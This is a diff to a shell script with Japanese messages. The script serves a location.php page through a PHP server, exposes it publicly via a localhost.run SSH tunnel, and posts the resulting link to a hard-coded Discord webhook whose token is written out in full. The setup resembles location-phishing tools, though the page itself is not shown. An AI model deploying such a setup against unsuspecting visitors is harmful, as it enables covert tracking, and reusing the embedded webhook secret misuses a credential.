@@ -19,28 +19,33 @@ chmod 644 /var/www/*.php 2>/dev/null
 echo "📄 サーバールートのファイル一覧:"
 ls -l /var/www/
 
-if [ ! -f /var/www/index.php ] && [ ! -f /var/www/location.php ]; then
-  echo "⚠️  /var/www/ に index.php または location.php がありません。"
-  echo "    PHPファイルを /var/www/ に配置してください。"
+if [ ! -f /var/www/location.php ]; then
+  echo "⚠️  /var/www/ に location.php がありません。"
+  echo "    location.phpを /var/www/ に配置してください。"
+  exit 1
 fi
 
 echo "🚀 PHPサーバーを起動中（ポート: 8080, /var/www がルート）..."
 cd /var/www
-php -S 0.0.0.0:9999 > /dev/null 2>&1 &
+php -S 0.0.0.0:8080 > /tmp/php-server.log 2>&1 &
 php_pid=$!
 sleep 2
 
 echo "🌐 トンネル起動中（localhost.run）..."
-yes yes | ssh -o StrictHostKeyChecking=accept-new -R 80:localhost:9999 nokey@localhost.run > .log 2>&1 &
+yes yes | ssh -o StrictHostKeyChecking=accept-new -R 80:localhost:8080 nokey@localhost.run > .log 2>&1 &
 ssh_pid=$!
 sleep 5
 
 url=$(grep -o 'https://[^ ]*\.lhr\.life' .log | head -n 1)
 echo "✨ 発行URL: $url"
+echo "🔗 location.phpへは: $url/location.php でアクセスできます"
 
 webhook_url="https://discordapp.com/api/webhooks/1356867692899860557/anLF-C2F9gOlPyjCgnJm5B1F5yWARixCnRYA6cXmCOXyVvLvOY2WQOjN03QOp5TQzT3x"
-json="{\"content\": \"🔔 URLが発行されました\n$url\"}"
+json="{\"content\": \"🔔 URLが発行されました\n$url/location.php\"}"
 curl -H "Content-Type: application/json" -X POST -d "$json" "$webhook_url" > /dev/null 2>&1
+
+echo "📝 PHPサーバーログ出力（直近10行）:"
+tail -n 10 /tmp/php-server.log
 
 trap 'echo "🛑 停止中..."; kill $php_pid $ssh_pid; exit 0' INT
 wait
